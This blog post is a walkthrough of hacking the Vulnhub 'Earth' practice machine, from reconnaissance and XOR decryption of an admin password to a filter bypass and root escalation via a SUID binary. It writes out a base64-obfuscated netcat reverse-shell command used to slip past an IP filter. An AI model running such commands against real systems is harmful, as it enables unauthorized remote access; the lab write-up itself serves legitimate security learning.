---
layout: post
title: "Vulnhub Earth Walkthrough"
date: 2023-04-10 10:00:00 +0000
categories: [post, hacking]
tags: [post, hacking, medium]
---
This blog post will be focused on a walkthrough on hacking Vulnhub’s The Planets: Earth machine. There are two flags to be found according to the description: “a user and root flag which include an md5 hash”. The tools covered here will be nmap, dirb, and CyberChef.


The first thing I did on my Kali Linux machine was to see if the vulnerable machine was up and running, and to find out the machine’s IP address.


My Kali Linux machine is 192.168.56.22, so Earth’s address must be 192.168.56.23. And according to the nmap scan, the ports open up are ports 22 (SSH), 80 (HTTP), and 443 (HTTPS). Those two ports open up means there must be a web application. Before doing anything else, I opened up my browser in order to see what the web application looks like, and see if I can find anything I can use.

If you use http to view the web app, you will see a 400 error. However, if you use https, you will see a default web page. If you take a look at the certificate, you will see the DNS name for the web server.


HTTP

HTTPS
In order to continue with reconnaissance, I used a few tools. The first was a specific nmap scan of the machine.


Breaking down the nmap command, -p 22,80,443 just means I’m scanning those ports. I figured since this was an ‘easy’ machine, I really wouldn’t need to scan for more. -O is for the operating system, which you need sudo (root or administrator on Linux) privileges for, and the -sV flag is getting the service versions for those services running. I’m basically just looking for potential vulnerabilities. If outdated versions of services are running, for example, then I can use that to get into the system.

As a side note, when you’re doing this, you should direct the output to a file. I forgot to do that, and when I wanted to get the information again, I had to run a second nmap scan. It’s not a big deal in this scenario, but in an actual penetration test, that is probably a big mistake.

To do a little bit more web enumeration, I used the dirb command, a command line web enumeration tool, in order to find out what directories on the service are running. If you don’t specify the wordlist, it will default to common.txt. That was what I wanted, so I didn’t use any other wordlist for this particular stage. And again, I would definitely append this to a file so you can reference it later.

The results of the dirb scan said there was one directory, the cgi-bin directory, and that returns a 403 error.


Up until this point I was using the ip address for nmap and dirb. And while doing that, I couldn’t figure anything out. The versions of http and https didn’t have vulnerabilities that I was going to be able to exploit. It looked like I had hit a dead end. I looked at the certificate again, and I edited my /etc/hosts file to map the hostname to the ip address. After I did that, this web enumeration became a lot easier. You can just use any text editor of choice to map the ip address to ‘earth.local’ and ‘terratest.earth.local’.



From the screenshot, there is a user input field that allows me to send a message to Earth. There are previous messages that also look encrypted.

Doing another dirb scan of both earth.local and terratest.earth.local, there is a new directory, called admin. When I visit there, there is a login field. This is a good discovery, but I don’t really have any useful information. I don’t have usernames and I don’t have passwords.



Also, up until this point, I was using http for the dirb scan. Switching up to https, however, gave me much more detail.


It specifically gave me a robots.txt file. That file essentially just tells web crawlers what pages they can and can’t visit. Visiting the robots.txt page, one disallowed directory caught my eye. Visiting that page got me a username, and it also got me the encryption method (XOR).



And then going to the other page mentioned, testdata.txt, got me this message.


That message, mentioned in the previous page, is the key used. When it comes to encryption, if the key is compromised, then a new key needs to be used asap. You definitely do not want any attackers finding your encryption key. Anything encrypted can be decrypted using the key.

Trying to decode the first two messages on the web page is useless, they’re just nonsensical messages. The third one is the most important one. To decode it, I went to CyberChef.

This part took a lot of googling on my part, but I found that converting the message From Hex, and then using XOR with the testdata.txt as the key managed to decrypt the message.


That looks like it could be something good, like a password. I have a username ‘terra’. Going back to the login page, I tried that as the password, and I was in the system.


And I could run commands. The first thing I wanted to do was set up a netcat listener. I ran ‘which nc’ to make sure the ‘nc’ command was on the machine. It was on the machine, so I could theoretically run it.


However, when I tried to run it, I ran into that message. I would have to figure out another way of getting into the system. That however, took a while, so before that I decided to run “locate ‘flag’” to see if I could find the first flag just on this CLI interface.



With the first flag found, I needed to figure out how I could spawn that shell on the system. The easiest solution would be to see if I could view the /etc/passwd and /etc/shadow file. If I could, then I could just brute force passwords. However, while the /etc/passwd was viewable, /etc/shadow was not.

Experimenting with it a bit further, and with a bit more googling and playing around with it, I found that the remote connections are being detected by IP address in the command.


In the screenshot, even though the command ‘echo’ is not going to set up a remote connection, it is still blocked because of the IP address. As a side note, if you type in an invalid IP address (if any of the numbers are over 255), then it’ll go through. So it’s not only testing the format, it’s also testing if it is a valid IP address.


So using that knowledge to set up a listener, I did the following steps. There are probably easier ways to do this, but this is how I did it.

Encode the command that I’m going to run on the web CLI. This command is going to set up the listener. Encoding it will ensure that the command will slip through whatever is detecting the IP address. You can probably use any command line encryption method, but I used base64.


Set up a netcat listener on your port of choice.


On the victim web application, echo the encoded command, pipe the output to be decoded, and then run ‘bash -’ to ensure that the stdin is run as a command. It should look something like this:
echo “bmMgMTkyLjE2OC41Ni4yMiA0NDQ0IC1lIC9iaW4vYmFzaAo=” | base64 -d | bash -


After doing all that, I have a listener on the machine! And to make sure I had some more interface control, I spawned an interactive shell.


And now, I had to figure out how to pivot from here. I am currently an apache user, and I need to figure out how to get to root. The first thing I did was run ‘sudo -l’ to figure out what I can run as a sudo user. However, even that required a password, so I figured that wasn’t going to be fruitful.


Running the above command finds all binaries where they run as the owner of the file, not as the user who called it. There is a binary called ‘reset_root’. If you try to run that, it fails and says that “all triggers not present”. I figured I needed to find out what those triggers are. Using the strings command, I wanted to see exactly what this binary does. I found that if the binary runs successfully, root’s password will be changed to ‘Earth’. To figure out what exactly the triggers needed to be, I transferred the binary over to my Kali Linux machine. To do that, I just set up a ncat listener on my Kali machine to send any output to a file, and then sent it over on the shell I had on the victim machine.



Then after that, I changed the permissions on the reset_root binary so that it is executable, and then used the ltrace command on it. Ltrace is essentially a command that runs another binary and sees what libraries are called. This is a great way to see what the ‘triggers’ the binary needs.


And I saw what the triggers were for the binary to run successfully. I switched back over to the reverse shell, and I created those files. Then after running the binary, root password was switched to Earth.


And then after that getting the root flag was straightforward. I switched over to root, went to the root directory, and the flag was there.



This was a fun machine, and it is apparently the third in a series (Earth being the third planet from the sun). I think the main thing I learned from this was to basically not overlook anything. There were a few times during this where I was lost because of something I overlooked.

